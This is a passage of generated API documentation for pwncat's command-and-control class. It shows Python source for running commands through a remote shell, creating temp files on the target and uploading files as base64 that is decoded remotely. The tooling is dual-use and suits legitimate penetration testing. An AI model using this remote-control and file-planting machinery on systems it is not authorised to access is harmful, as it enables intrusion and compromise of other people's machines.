        command.append(<span class="hljs-string">"{} -c 'import base64;"</span>.format(self.__remote_python))
        command.append(<span class="hljs-string">'f=open("{}", "r");'</span>.format(rpath_source))
        command.append(<span class="hljs-string">"lines = f.readlines();"</span>)
        <span class="hljs-keyword">if</span> self.__remote_py3:
            command.append(
                <span class="hljs-string">'print((b"".join([base64.b64decode(l.encode()) for l in lines])).decode());\''</span>
            )
        <span class="hljs-keyword">else</span>:
            command.append(<span class="hljs-string">'print "".join([base64.b64decode(l) for l in lines]);\''</span>)
        command.append(<span class="hljs-string">'&gt; "{}"'</span>.format(rpath_target))

        self.print_info(<span class="hljs-string">"Decoding: {} -&gt; {}"</span>.format(rpath_source, rpath_target))
        self.remote_command(<span class="hljs-string">""</span>.join(command), <span
                                    class="hljs-literal">False</span>)
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> validate via md5</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre>
                    </details>
                    <h3>Subclasses</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.CNCAutoDeploy"
                               title="pwncat.CNCAutoDeploy">CNCAutoDeploy</a>
                        </li>
                    </ul>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.CNC.remote_py3"><code class="name">var <span class="ident">remote_py3</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p>Is remote version Python3? Else it is Python2.</p>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_py3</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""Is remote version Python3? Else it is Python2."""</span>
    <span class="hljs-keyword">return</span> self.__remote_py3</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.CNC.remote_python"><code class="name">var <span
                                class="ident">remote_python</span></code></dt>
                        <dd>
                            <div class="desc"><p>Discovered absolute Python remote path.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_python</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; str</span>
    <span class="hljs-string">"""Discovered absolute Python remote path."""</span>
    <span class="hljs-keyword">return</span> self.__remote_python</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.CNC.create_remote_tmpfile"><code class="name flex">
                            <span>def <span class="ident">create_remote_tmpfile</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>OS-independent remote tempfile creation.</p>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>str</code> or <code>None</code></dt>
                                    <dd>Returns path on success or None on error.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">create_remote_tmpfile</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
    <span class="hljs-string">"""OS-independent remote tempfile creation.

    Returns:
        str or None: Returns path on success or None on error.
    """</span>
    self.flush_receive()
    self.print_info(<span class="hljs-string">"Creating tmpfile:"</span>, <span
                                            class="hljs-literal">False</span>, <span
                                            class="hljs-literal">True</span>)

    command = []
    command.append(<span class="hljs-string">"{} -c '"</span>.format(self.__remote_python))
    command.append(<span class="hljs-string">"import tempfile;"</span>)
    command.append(<span class="hljs-string">"h,f=tempfile.mkstemp();"</span>)
    <span class="hljs-keyword">if</span> self.__remote_py3:
        command.append(<span class="hljs-string">"print(f);"</span>)
    <span class="hljs-keyword">else</span>:
        command.append(<span class="hljs-string">"print f;"</span>)
    command.append(<span class="hljs-string">"'"</span>)
    response = self.remote_command(<span class="hljs-string">""</span>.join(command), <span
                                            class="hljs-literal">True</span>)

    <span class="hljs-comment"># All good</span>
    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span> <span
                                            class="hljs-keyword">and</span> len(response) == <span
                                            class="hljs-number">1</span>:
        tmpfile = StringEncoder.decode(response[<span class="hljs-number">0</span>]).rstrip()
        self.print_info(<span class="hljs-string">"Creating tmpfile: {}"</span>.format(repr(tmpfile)), <span
                                            class="hljs-literal">True</span>, <span
                                            class="hljs-literal">True</span>)
        <span class="hljs-keyword">return</span> tmpfile

    <span class="hljs-comment"># Something went wrong with stripping prefix from server, we need to manually</span>
    <span class="hljs-comment"># check if creation was successful.</span>
    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span> <span
                                            class="hljs-keyword">and</span> len(response) &gt; <span
                                            class="hljs-number">1</span>:
        <span class="hljs-comment"># A bit fuzzy, but we try a few times</span>
        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span
                                            class="hljs-number">5</span>):
            self.print_info(<span class="hljs-string">"Creating tmpfile: Unsure - checking otherwise"</span>, <span
                                            class="hljs-literal">True</span>, <span
                                            class="hljs-literal">True</span>)
            <span class="hljs-keyword">for</span> candidate <span class="hljs-keyword">in</span> response:
                tmpfile = StringEncoder.decode(candidate).rstrip()
                <span class="hljs-keyword">if</span> self.remote_file_exists(tmpfile):
                    self.print_info(<span class="hljs-string">"Creating tmpfile: {}"</span>.format(repr(tmpfile)), <span
                                            class="hljs-literal">True</span>, <span
                                            class="hljs-literal">True</span>)
                    <span class="hljs-keyword">return</span> tmpfile

    self.print_info(<span class="hljs-string">"Creating tmpfile: Failed"</span>, <span
                                            class="hljs-literal">True</span>, <span
                                            class="hljs-literal">True</span>)
    self.print_info(<span class="hljs-string">"Response: {}"</span>.format(repr(response)))
    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.CNC.flush_receive"><code class="name flex">
                            <span>def <span
                                    class="ident">flush_receive</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Try to reveive everything which is currently being
                                sent from remote.</p>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>List[bytes]</code></dt>
                                    <dd>Returns a list of bytes of received data.</dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socket.error</code></dt>
                                    <dd>Except here when unconnected or connection was forcibly
                                        closed.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">flush_receive</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; List[bytes]</span>
    <span class="hljs-string">"""Try to reveive everything which is currently being sent from remote.

    Returns:
        List[bytes]: Returns a list of bytes of received data.

    Raises:
        socket.error:   Except here when unconnected or connection was forcibly closed.
    """</span>
    self.print_info(<span class="hljs-string">"Flushing receive buffer (this can take some time) ..."</span>)

    self.send(<span class="hljs-string">b"\n"</span>)
    data1 = self.send_recv(<span class="hljs-literal">None</span>, <span
                                            class="hljs-literal">False</span>, <span
                                            class="hljs-literal">False</span>)
    data2 = self.send_recv(<span class="hljs-literal">None</span>, <span
                                            class="hljs-literal">False</span>, <span
                                            class="hljs-literal">False</span>)

    self.print_info(<span class="hljs-string">"Flushing receive buffer done."</span>)
    <span class="hljs-keyword">return</span> data1 + data2</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.CNC.print_info"><code class="name flex">
                            <span>def <span class="ident">print_info</span></span>(<span>self, message=None, newline=True, erase=False)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Print a message to the local screen to inform the
                                user.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>message</code></strong> :<code>str</code>
                                    </dt>
                                    <dd>The message to print.</dd>
                                    <dt><strong><code>newline</code></strong> :<code>bool</code>
                                    </dt>
                                    <dd>Add a newline?</dd>
                                    <dt><strong><code>erase</code></strong> :<code>bool</code></dt>
                                    <dd>Erase previously printed text on the same line.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">print_info</span>(<span
                                        class="hljs-params">self, message=None, newline=True, erase=False</span>):</span>
    <span class="hljs-comment"># type: (Optional[str], bool, bool) -&gt; None</span>
    <span class="hljs-string">"""Print a message to the local screen to inform the user.

    Args:
        message (str): The message to print.
        newline (bool): Add a newline?
        erase (bool): Erase previously printed text on the same line.
    """</span>
    end = <span class="hljs-string">"\n"</span> <span class="hljs-keyword">if</span> newline <span
                                            class="hljs-keyword">else</span> <span
                                            class="hljs-string">""</span>
    prefix = <span class="hljs-string">"{}[PWNCAT CnC]{} "</span>.format(self.__COLORS[<span
                                            class="hljs-string">"yellow"</span>], self.__COLORS[<span
                                            class="hljs-string">"reset"</span>])
    <span class="hljs-keyword">if</span> message <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span>:
        message = <span class="hljs-string">""</span>
        prefix = <span class="hljs-string">""</span>

    <span class="hljs-keyword">if</span> erase:
        print(<span class="hljs-string">"\r"</span> * <span class="hljs-number">1024</span> + <span
                                            class="hljs-string">"{}{}"</span>.format(prefix, message), end=end)
        sys.stdout.flush()
    <span class="hljs-keyword">else</span>:
        print(<span class="hljs-string">"{}{}"</span>.format(prefix, message), end=end)
        sys.stdout.flush()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.CNC.print_raw"><code class="name flex">
                            <span>def <span class="ident">print_raw</span></span>(<span>self, message, newline)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Print a message to the local screen without
                                color/prefix.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>message</code></strong> :<code>bytes</code>
                                    </dt>
                                    <dd>The message to print.</dd>
                                    <dt><strong><code>newline</code></strong> :<code>bool</code>
                                    </dt>
                                    <dd>Add a newline?</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">print_raw</span>(<span
                                        class="hljs-params">self, message, newline</span>):</span>
    <span class="hljs-comment"># type: (bytes, bool) -&gt; None</span>
    <span class="hljs-string">"""Print a message to the local screen without color/prefix.

    Args:
        message (bytes): The message to print.
        newline (bool): Add a newline?
    """</span>
    <span class="hljs-keyword">if</span> self.__py3:
        end = <span class="hljs-string">b"\n"</span> <span
                                            class="hljs-keyword">if</span> newline <span
                                            class="hljs-keyword">else</span> <span
                                            class="hljs-string">b""</span>
        sys.stdout.buffer.write(<span class="hljs-string">b""</span>.join([message, end]))
    <span class="hljs-keyword">else</span>:
        end = <span class="hljs-string">"\n"</span> <span
                                            class="hljs-keyword">if</span> newline <span
                                            class="hljs-keyword">else</span> <span
                                            class="hljs-string">""</span>  <span
                                            class="hljs-comment"># type: ignore</span>
        print(message, end=end)  <span class="hljs-comment"># type: ignore</span>

    <span class="hljs-comment"># For issues with flush (when using tail -F or equal) see links below:</span>
    <span class="hljs-comment"># https://stackoverflow.com/questions/26692284</span>
    <span class="hljs-comment"># https://docs.python.org/3/library/signal.html#note-on-sigpipe</span>
    <span class="hljs-keyword">try</span>:
        sys.stdout.flush()
    <span class="hljs-keyword">except</span> IOError:
        <span class="hljs-comment"># Python flushes standard streams on exit; redirect remaining output</span>
        <span class="hljs-comment"># to devnull to avoid another broken pipe at shutdown</span>
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, sys.stdout.fileno())</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.CNC.remote_command"><code class="name flex">
                            <span>def <span class="ident">remote_command</span></span>(<span>self, command, output)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Run remote command with correct linefeeds and
                                receive response lines.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>command</code></strong> :<code>str</code>
                                    </dt>
                                    <dd>The command to execute on the remote end.</dd>
                                    <dt><strong><code>output</code></strong> :<code>bool</code>
                                    </dt>
                                    <dd>Receive output from command?</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">remote_command</span>(<span
                                        class="hljs-params">self, command, output</span>):</span>
    <span class="hljs-comment"># type: (str, bool) -&gt; Optional[List[bytes]]</span>
    <span class="hljs-string">"""Run remote command with correct linefeeds and receive response lines.

    Args:
        command (str): The command to execute on the remote end.
        output (bool): Receive output from command?
    """</span>
    command = command.rstrip(<span class="hljs-string">"\r\n"</span>)
    command = command.rstrip(<span class="hljs-string">"\r"</span>)
    command = command.rstrip(<span class="hljs-string">"\n"</span>)
    command = command + <span class="hljs-string">"\n"</span>
    <span class="hljs-keyword">if</span> output:
        <span class="hljs-keyword">return</span> self.send_recv(StringEncoder.encode(command), <span
                                            class="hljs-literal">True</span>, <span
                                            class="hljs-literal">True</span>)
    self.send(StringEncoder.encode(command))
    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.CNC.remote_file_exists"><code class="name flex">
                            <span>def <span class="ident">remote_file_exists</span></span>(<span>self, remote_path)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Ensure given remote path exists as a file on remote
                                end.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>remote_path</code></strong> :<code>str</code>
                                    </dt>
                                    <dd>Path of file to check.</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>bool</code></dt>
                                    <dd>Returns <code>True</code> on success and <code>False</code>
                                        on failure.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">remote_file_exists</span>(<span
                                        class="hljs-params">self, remote_path</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; bool</span>
    <span class="hljs-string">"""Ensure given remote path exists as a file on remote end.

    Args:
        remote_path (str): Path of file to check.

    Returns:
        bool: Returns `True` on success and `False` on failure.
    """</span>
    self.flush_receive()

    <span class="hljs-comment"># String should be short as an unstable remote might send small chunks</span>
    unique_string = <span class="hljs-string">"_pwncat_"</span>
    response = self.remote_command(
        <span class="hljs-string">'test -f "{}" &amp;&amp; echo "{}"'</span>.format(remote_path, unique_string), <span
                                            class="hljs-literal">True</span>
    )
    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">for</span> candidate <span class="hljs-keyword">in</span> response:
            <span class="hljs-keyword">if</span> StringEncoder.decode(candidate) == unique_string:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">if</span> StringEncoder.decode(candidate).rstrip() == unique_string:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    response = self.flush_receive()
    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">for</span> candidate <span class="hljs-keyword">in</span> response:
            <span class="hljs-keyword">if</span> StringEncoder.decode(candidate).rstrip() == unique_string:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">if</span> StringEncoder.decode(candidate).rstrip() == unique_string:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.CNC.send"><code class="name flex">
                            <span>def <span
                                    class="ident">send</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Send data through a connected (TCP) or unconnected
                                (UDP) socket.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>data</code></strong> :<code>bytes</code></dt>
                                    <dd>The data to send.</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>int</code></dt>
                                    <dd>Returns total bytes sent.</dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socket.error</code></dt>
                                    <dd>Except here when unconnected or connection was forcibly
                                        closed.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">send</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; int</span>
    <span class="hljs-string">"""Send data through a connected (TCP) or unconnected (UDP) socket.

    Args:
        data (bytes): The data to send.

    Returns:
        int: Returns total bytes sent.

    Raises:
        socket.error:   Except here when unconnected or connection was forcibly closed.
    """</span>
    <span class="hljs-keyword">return</span> self.__net.net.send(data)</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.CNC.send_recv"><code class="name flex">
                            <span>def <span class="ident">send_recv</span></span>(<span>self, data, strip_suffix=True, strip_echo=False)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Send data through a connected (TCP) or unconnected
                                (UDP) socket and receive all replies.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt>data (None|bytes): The data to send. If None, will skip
                                        sending.
                                    </dt>
                                    <dt><strong><code>strip_suffix</code></strong>
                                        :<code>bool</code></dt>
                                    <dd>Strip remote suffix from received data?</dd>
                                    <dt><strong><code>strip_echo</code></strong> :<code>bool</code>
                                    </dt>
                                    <dd>Also remove 'data' from output if server has echo'ed it?
                                    </dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>List[bytes]</code></dt>
                                    <dd>Returns a list of bytes of received data.</dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socket.error</code></dt>
                                    <dd>Except here when unconnected or connection was forcibly
                                        closed.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">send_recv</span>(<span
                                        class="hljs-params">self, data, strip_suffix=True, strip_echo=False</span>):</span>
    <span class="hljs-comment"># type: (Optional[bytes], bool, bool) -&gt; List[bytes]</span>
    <span class="hljs-string">"""Send data through a connected (TCP) or unconnected (UDP) socket and receive all replies.

    Args:
        data (None|bytes): The data to send. If None, will skip sending.
        strip_suffix (bool): Strip remote suffix from received data?
        strip_echo (bool): Also remove 'data' from output if server has echo'ed it?

    Returns:
        List[bytes]: Returns a list of bytes of received data.

    Raises:
        socket.error:   Except here when unconnected or connection was forcibly closed.
    """</span>
    <span class="hljs-comment"># [1/4] Send</span>
    <span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>:
        self.__net.net.send(data)

    <span class="hljs-comment"># [2/4] Receive actual reply</span>
    responses = []

    <span class="hljs-comment"># Setup timer and current receive round</span>
    time_start = datetime.now()
    curr_round = <span class="hljs-number">0</span>

    <span class="hljs-keyword">while</span> curr_round &lt; self.__recv_rounds:
        <span class="hljs-keyword">try</span>:
            response = self.__net.net.receive()
        <span class="hljs-keyword">except</span> socket.timeout:
            time.sleep(self.__recv_timeout)
            time_step = datetime.now()
            time_diff = time_step - time_start

            self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                <span class="hljs-string">"Timeout: Receive timed out after %f sec in %d/%d rounds"</span>,
                time_diff.total_seconds(),
                curr_round + <span class="hljs-number">1</span>,
                self.__recv_rounds,
            )
            curr_round += <span class="hljs-number">1</span>
        <span class="hljs-comment"># On successful read, we can determine to adjust timings.</span>
        <span class="hljs-keyword">else</span>:
            time_end = datetime.now()
            time_diff = time_end - time_start

            self.__recv_times.append(time_diff.total_seconds())
            self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                <span class="hljs-string">"Timeout: Receive took %f sec (avg: %f) to receive in %d/%d rounds"</span>,
                time_diff.total_seconds(),
                sum(self.__recv_times) / len(self.__recv_times),
                curr_round + <span class="hljs-number">1</span>,
                self.__recv_rounds,
            )

            <span class="hljs-comment"># Retries were required</span>
            prev_recv_timeout = self.__recv_timeout
            <span class="hljs-keyword">if</span> curr_round &gt; <span class="hljs-number">1</span>:
                self.__recv_timeout += time_diff.total_seconds()
            <span class="hljs-comment"># No retries requred</span>
            <span class="hljs-keyword">else</span>:
                self.__recv_timeout = time_diff.total_seconds() / <span class="hljs-number">2</span>

            self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                <span class="hljs-string">"Timeout: Previous recv timeout: %f sec -&gt; new recv timeout: %f sec"</span>,
                prev_recv_timeout,
                self.__recv_timeout,
            )

            <span class="hljs-comment"># Add response</span>
            <span class="hljs-keyword">if</span> response:
                responses.append(response)

            <span class="hljs-comment"># Reset the start time and round</span>
            time_start = datetime.now()
            curr_round = <span class="hljs-number">0</span>

    <span class="hljs-comment"># Return if already empty</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> responses:
        <span class="hljs-keyword">return</span> responses

    <span class="hljs-comment"># Response could be in one of the below listed formats:</span>
    <span class="hljs-comment"># 1. response could be one line per element</span>
    <span class="hljs-comment"># 2. reposnse could be multiple lines per element</span>
    <span class="hljs-comment"># 3. response cloud be single characters per element</span>
    <span class="hljs-comment"># But we want to make sure that we always get one line per element,</span>
    <span class="hljs-comment"># so we normalize it</span>

    <span class="hljs-comment"># First: Join lines which do not have line endings</span>
    self.__log.debug(<span class="hljs-string">"Normalize recv before (1): %s"</span>, repr(responses))
    normalized = []
    has_eol = <span class="hljs-literal">True</span>
    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> responses:
        <span class="hljs-keyword">if</span> has_eol:
            normalized.append(line)
        <span class="hljs-keyword">else</span>:
            normalized[<span class="hljs-number">-1</span>] = normalized[<span class="hljs-number">-1</span>] + line
        <span class="hljs-comment"># Determine what to do next iteration</span>
        <span class="hljs-keyword">if</span> line.endswith(<span class="hljs-string">b"\r\n"</span>):
            has_eol = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">elif</span> line.endswith(<span class="hljs-string">b"\n"</span>):
            has_eol = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">elif</span> line.endswith(<span class="hljs-string">b"\r"</span>):
            has_eol = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">else</span>:
            has_eol = <span class="hljs-literal">False</span>
    responses = normalized
    self.__log.debug(<span class="hljs-string">"Normalize recv after  (1): %s"</span>, repr(responses))

    <span class="hljs-comment"># Second: Separate lines which have line endings</span>
    self.__log.debug(<span class="hljs-string">"Normalize recv before (2): %s"</span>, repr(responses))
    normalized = []
    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> responses:
        line = line.rstrip(<span class="hljs-string">b"\r\n"</span>)
        line = line.rstrip(<span class="hljs-string">b"\n"</span>)
        line = line.rstrip(<span class="hljs-string">b"\r"</span>)
        line = line.lstrip(<span class="hljs-string">b"\r\n"</span>)
        line = line.lstrip(<span class="hljs-string">b"\n"</span>)
        line = line.lstrip(<span class="hljs-string">b"\r"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">b"\r\n"</span> <span
                                            class="hljs-keyword">in</span> line:
            <span class="hljs-keyword">for</span> newline <span class="hljs-keyword">in</span> line.split(<span
                                            class="hljs-string">b"\r\n"</span>):
                normalized.append(newline)
        <span class="hljs-keyword">elif</span> <span class="hljs-string">b"\n"</span> <span
                                            class="hljs-keyword">in</span> line:
            <span class="hljs-keyword">for</span> newline <span class="hljs-keyword">in</span> line.split(<span
                                            class="hljs-string">b"\n"</span>):
                normalized.append(newline)
        <span class="hljs-keyword">elif</span> <span class="hljs-string">b"\r"</span> <span
                                            class="hljs-keyword">in</span> line:
            <span class="hljs-keyword">for</span> newline <span class="hljs-keyword">in</span> line.split(<span
                                            class="hljs-string">b"\r"</span>):
                normalized.append(newline)
        <span class="hljs-keyword">else</span>:
            normalized.append(line)
    responses = normalized
    self.__log.debug(<span class="hljs-string">"Normalize recv after  (2): %s"</span>, repr(responses))

    <span class="hljs-comment"># [3/4] Remove remote ends suffix (if it sends something like it)</span>
    <span class="hljs-comment"># We iterate reversed of responses and check if the new line suffix(es)</span>
    <span class="hljs-comment"># are present at the end.</span>
    <span class="hljs-comment"># This is because the suffix(es) is always received last.</span>
    <span class="hljs-keyword">if</span> self.__remote_suffix <span class="hljs-keyword">and</span> strip_suffix:
        <span class="hljs-comment"># If multiple suffix lines are send we will first strip x-1 suffix lines</span>
        <span class="hljs-keyword">if</span> len(self.__remote_suffix) &gt; <span
                                            class="hljs-number">1</span>:
            lines_to_strip = len(self.__remote_suffix) - <span class="hljs-number">1</span>
            self.__log.debug(<span class="hljs-string">"Remove suffix before (1): %s"</span>, repr(responses))
            responses = responses[:-lines_to_strip]
            self.__log.debug(<span class="hljs-string">"Remove suffix after  (1): %s"</span>, repr(responses))

        <span class="hljs-comment"># Return if already empty</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> responses:
            <span class="hljs-keyword">return</span> responses

        <span class="hljs-comment"># Clean up the last response line with first suffix line</span>
        self.__log.debug(<span class="hljs-string">"Remove suffix before (2): %s"</span>, repr(responses))
        responses[<span class="hljs-number">-1</span>] = responses[<span
                                            class="hljs-number">-1</span>].rstrip(self.__remote_suffix[<span
                                            class="hljs-number">0</span>])
        self.__log.debug(<span class="hljs-string">"Remove suffix after  (2): %s"</span>, repr(responses))

        <span class="hljs-comment"># Ensure empty elements are removed</span>
        self.__log.debug(<span class="hljs-string">"Remove suffix before (3): %s"</span>, repr(responses))
        responses = [item <span class="hljs-keyword">for</span> item <span
                                            class="hljs-keyword">in</span> responses <span
                                            class="hljs-keyword">if</span> item]
        self.__log.debug(<span class="hljs-string">"Remove suffix after  (3): %s"</span>, repr(responses))

    <span class="hljs-comment"># [4/4] Some server also echo back what we've send, so if we did send something</span>
    <span class="hljs-comment"># we need to strip this off as well</span>
    <span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span> <span
                                            class="hljs-keyword">and</span> strip_echo:
        <span class="hljs-keyword">for</span> idx, item <span class="hljs-keyword">in</span> enumerate(responses):
            <span class="hljs-keyword">if</span> data <span class="hljs-keyword">in</span> responses[idx]:
                <span class="hljs-keyword">del</span> responses[idx]
            <span class="hljs-keyword">elif</span> data.rstrip() <span
                                            class="hljs-keyword">in</span> responses[idx]:
                <span class="hljs-keyword">del</span> responses[idx]
            <span class="hljs-comment"># Ensure empty elements are removed</span>
            responses = [item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> responses <span
                                            class="hljs-keyword">if</span> item]

    <span class="hljs-comment"># Return list of respones</span>
    <span class="hljs-keyword">return</span> responses</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.CNC.upload"><code class="name flex">
                            <span>def <span class="ident">upload</span></span>(<span>self, lpath, rpath)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>OS-independent upload of a local file to a remote
                                path.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>lpath</code></strong> :<code>str</code></dt>
                                    <dd>Local path of the file.</dd>
                                    <dt><strong><code>rpath</code></strong> :<code>str</code></dt>
                                    <dd>Remote path, where to upload the base64 encoded file.</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>bool</code></dt>
                                    <dd>Returns <code>True</code> on success and <code>False</code>
                                        on failure.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span
                                        class="hljs-params">self, lpath, rpath</span>):</span>
    <span class="hljs-comment"># type: (str, str) -&gt; bool</span>
    <span class="hljs-string">"""OS-independent upload of a local file to a remote path.

    Args:
        lpath (str): Local path of the file.
        rpath (str): Remote path, where to upload the base64 encoded file.

    Returns:
        bool: Returns `True` on success and `False` on failure.
    """</span>
    <span class="hljs-keyword">assert</span> self.__remote_python <span
                                            class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>
    <span class="hljs-keyword">assert</span> self.__remote_py3 <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>

    rpath_b64 = self.create_remote_tmpfile()
    self.flush_receive()
    <span class="hljs-keyword">if</span> rpath_b64 <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__upload_file_base_64_encoded(lpath, rpath_b64, <span
